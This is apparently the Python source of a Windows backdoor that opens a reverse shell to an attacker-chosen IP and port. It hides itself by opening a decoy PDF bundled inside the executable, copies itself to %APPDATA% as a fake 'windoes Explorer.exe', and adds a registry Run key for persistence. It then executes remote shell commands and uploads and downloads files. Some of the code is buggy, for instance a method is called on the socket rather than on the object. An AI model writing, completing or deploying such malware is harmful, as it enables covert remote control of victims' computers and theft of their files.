#!/usr/bin/env python

import socket, subprocess, json, os, base64, sys, shutil


class Backdoor:
   def __init__(self, ip, port):
      self.persistence()
      self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      self.connection.connect((ip, port))

   def persistence(self):
      payload_location = os.environ["appdata"] + "\\windoes Explorer.exe"
      if not os.path.exists(payload_location):
         shutil.copyfile(sys.executable, payload_location)
         subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + payload_location + '"')

   def reliable_send(self, data):
      json_data = json.dumps(data)
      self.connection.send(json_data.encode())

   def reliable_receive(self):
      json_data = b""
      while True:
         try:
            json_data = json_data + self.connection.recv()
            return json.loads(json_data)
         except ValueError:
            continue 

   def exe_sys_cmmd(self, cmmd):
      return subprocess.check_output(cmmd, shell=True, stderr = subprocess.DEVNULL, stdin = subprocess.DEVNULL)

   def change_working_dir_to(self, path):
      os.chdir(path)
      return "[+] Changing working directory to: " + path

   def write_file(self, path, data):
      with open(path, 'wb') as f:
         f.write(base64.b64decode(data))
         return "\n[+] Upload successful.\n"

   def read_file(self, path):
      with open(path, "rb") as f:
         return base64.b64encode(f.read())

   def run(self):
      while True:
         cmmd = self.connection.reliable_receive()

         try:
            if cmmd[0] == "close":
               self.connection.close()
               print("\n[+] Connection closed.\n")
               sys.exit()
            elif cmmd[0] == "cd" and len(cmmd) > 1:
               cmmd_result = self.change_working_dir_to(cmmd[1])
            elif cmmd[0] == "download":
               cmmd_result = self.read_file(cmmd[1]).decode()
            elif cmmd[0] == "upload":
               cmmd_result = self.write_file(cmmd[1], cmmd[2])
            else:
               cmmd_result = self.exe_sys_cmmd(cmmd).decode()
         except Exception:
            cmmd_result = "[-] Error during command execution."


         self.reliable_send(cmmd_result)

file_name = sys._MEIPASS + "\dummy.pdf"
subprocess.Popen(file_name, shell=True)

try:
   # 1st argv[1]: listener IP, argv[2]: port
   Backdoor = Backdoor(str(sys.argv[1]), int(sys.argv[2]))
   Backdoor.run()
except:
   sys.exit()


